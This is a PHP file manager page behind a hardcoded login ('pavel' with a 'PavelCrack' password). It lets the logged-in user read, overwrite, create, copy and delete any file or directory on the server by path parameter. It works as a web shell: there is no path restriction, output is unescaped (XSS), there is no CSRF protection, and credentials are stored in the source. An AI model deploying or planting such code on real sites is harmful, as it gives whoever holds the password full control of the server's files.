<?php
session_start();

// Handle login form submission
if (isset($_POST['login'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Static credentials (you can change them as needed)
    $validUsername = 'pavel';
    $validPassword = 'PavelCrack112244@';

    if ($username === $validUsername && $password === $validPassword) {
        $_SESSION['loggedIn'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit();
    } else {
        $errorMessage = 'Invalid login credentials';

    }
}

// Redirect to login page if user is not logged in
if (!isset($_SESSION['loggedIn']) && basename($_SERVER['PHP_SELF']) != 'login.php') {
    showLoginForm();
    exit();
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit();
}

// Directory logic
$directory = isset($_GET['directory']) ? $_GET['directory'] : '';
if (isset($_POST['directory'])) {
    $directory = $_POST['directory'];
}

// File Manager Actions
if (isset($_POST['newDirectory'])) {
    $newDirectory = $directory . "/" . $_POST["newDirectory"];
    mkdir($newDirectory);
}

if (isset($_POST['newFile'])) {
    $newFile = $directory . "/" . $_POST["newFile"];
    $newFile = fopen($newFile, "w");
    fclose($newFile);
}

if (isset($_GET['deleteFile'])) {
    $file = $_GET['deleteFile'];
    unlink($file);
}

if (isset($_GET['deleteDirectory'])) {
    $deleteDirectory = $_GET['deleteDirectory'];
    if (is_dir($deleteDirectory)) {
        if ($opendirectory = opendir($deleteDirectory)) {
            while (($file = readdir($opendirectory)) !== false) {
                if (is_file($deleteDirectory . '/' . $file))
                    unlink($deleteDirectory . '/' . $file);
            }
            closedir($opendirectory);
        }
    }
    rmdir($deleteDirectory);
}

if (isset($_GET['copyDirectory'])) {
    $file = $_GET['copyDirectory'];
    for ($i = 0; $i < 10; $i++)
        copy($file, $directory . "/" . uniqid());
}

if (isset($_GET['copyFile'])) {
    $file = $_GET['copyFile'];
    copy($file, $directory . "/copy-" . basename($file));
}

if (isset($_GET['file']) || isset($_POST['file'])) {
    $file = isset($_GET['file']) ? $_GET['file'] : $_POST['file'];

    if (isset($_POST['content'])) {
        $writeableFile = fopen($file, "w");
        $content = $_POST['content'];
        fwrite($writeableFile, $content);
        fclose($writeableFile);
    }
    showEditFileForm($file, $directory);
    exit();
}

// Display the file manager
showFileManager($directory);

// Function to display the login form
function showLoginForm()
{
    global $errorMessage;
    ?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">
    </head>

    <body>
        <div class="container">
            <h2 class="mt-5">Login</h2>
            <?php if (isset($errorMessage)) { ?>
                <div class="alert alert-danger"><?= $errorMessage ?></div>
            <?php } ?>
            <form method="post">
                <div class="form-group">
                    <label for="username">Username</label>
                    <input type="text" class="form-control" id="username" name="username" required>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" class="form-control" id="password" name="password" required>
                </div>
                <button type="submit" name="login" class="btn btn-primary">Login</button>
            </form>
        </div>
    </body>

    </html>
    <?php
}

// Function to display the file manager
function showFileManager($directory)
{
    ?>
    <!DOCTYPE html>
    <html>

    <head>
        <title>File Manager</title>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">
        <style>
            .form-control {
                background-color: #f4e6ab8c;
                border: 1px solid green;
            }
        </style>
    </head>

    <body>
        <div class="container-fluid">
            <div class="d-flex justify-content-between mt-3">
                <h2>File Manager</h2>
                <a href="?logout" class="btn btn-danger">Logout</a>
            </div>

            <div class="mt-2">
                <form action="" method="post">
                    <div class="form-group">
                        <label for="newDirectory">New Directory Name</label>
                        <input type="hidden" name="directory" value="<?= $directory ?>">
                        <input type="text" name="newDirectory" class="form-control" placeholder="Enter Directory Name">
                    </div>
                    <button type="submit" class="btn btn-success float-right">Create A New Directory</button>
                </form>
            </div>

            <div class="mt-4">
                <form action="" method="post">
                    <div class="form-group">
                        <label for="newFile">New File Name</label>
                        <input type="hidden" name="directory" value="<?= $directory ?>">
                        <input type="text" name="newFile" class="form-control" placeholder="Enter File Name">
                    </div>
                    <button type="submit" class="btn btn-success float-right">Create A New File</button>
                </form>
            </div>

            <div class="mt-4">
                <form action="" method="get">
                    <div class="form-group">
                        <label for="directory">Directory Path</label>
                        <input type="text" name="directory" class="form-control" placeholder="Enter Directory Path"
                            value="<?= $directory ?>">
                    </div>
                    <button type="submit" class="btn btn-primary float-right">Search</button>
                </form>
            </div>

            <table class="table mt-4">
                <thead>
                    <tr>
                        <th>Sl/No</th>
                        <th>File Name</th>
                        <th>Created</th>
                        <th>Last Modified</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    if (is_dir($directory)) {
                        if ($opendirectory = opendir($directory)) {
                            $i = 1;
                            while (($file = readdir($opendirectory)) !== false) {
                                if ($file != '.' && $file != '..') {
                                    $isFile = is_file($directory . '/' . $file);
                                    ?>
                                    <tr>
                                        <td><?= $i ?></td>
                                        <td><?= $isFile ? "<i class='fa fa-file'></i> $file" : "<i class='fa fa-folder'></i> $file" ?></td>
                                        <td><?= $isFile ? date("d F, Y h:i:s A", filectime($directory . '/' . $file)) : '' ?></td>
                                        <td><?= $isFile ? date("d F, Y h:i:s A", filemtime($directory . '/' . $file)) : '' ?></td>
                                        <td>
                                            <?php if ($isFile) { ?>
                                                <a href="?file=<?= $directory . '/' . $file ?>&directory=<?= $directory ?>"
                                                    class="btn btn-warning btn-sm">Edit</a>
                                                <a href="?copyFile=<?= $directory . '/' . $file ?>&directory=<?= $directory ?>"
                                                    class="btn btn-info btn-sm">Copy</a>
                                                <a href="?deleteFile=<?= $directory . '/' . $file ?>&directory=<?= $directory ?>"
                                                    class="btn btn-danger btn-sm">Delete</a>
                                            <?php } else { ?>
                                                <form action="" method="get">
                                                    <input type="hidden" name="directory" value="<?= $directory . '/' . $file ?>">
                                                    <button class="btn btn-primary btn-sm">View</button>
                                                </form>
                                                <a href="?copyDirectory=<?= $directory . '/' . $file ?>&directory=<?= $directory ?>"
                                                    class="btn btn-info btn-sm">Copy</a>
                                                <a href="?deleteDirectory=<?= $directory . '/' . $file ?>&directory=<?= $directory ?>"
                                                    class="btn btn-danger btn-sm">Delete</a>
                                            <?php } ?>
                                        </td>
                                    </tr>
                                    <?php
                                    $i++;
                                }
                            }
                            closedir($opendirectory);
                        }
                    }
                    ?>
                </tbody>
            </table>
        </div>
    </body>

    </html>
    <?php
}

// Function to show the edit file form
function showEditFileForm($file, $directory)
{
    $content = file_get_contents($file);
    ?>
    <!DOCTYPE html>
    <html>

    <head>
        <title>Edit File</title>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">
    </head>

    <body>
        <div class="container mt-5">
            <h2>Edit File: <?= basename($file) ?></h2>
            <form action="" method="post">
                <input type="hidden" name="file" value="<?= $file ?>">
                <input type="hidden" name="directory" value="<?= $directory ?>">
                <div class="form-group">
                    <label for="content">File Content:</label>
                    <textarea class="form-control" rows="15" name="content"><?= $content ?></textarea>
                </div>
                <button type="submit" class="btn btn-success">Save</button>
                <a href="?directory=<?= $directory ?>" class="btn btn-secondary">Back</a>
            </form>
        </div>
    </body>

    </html>
    <?php
}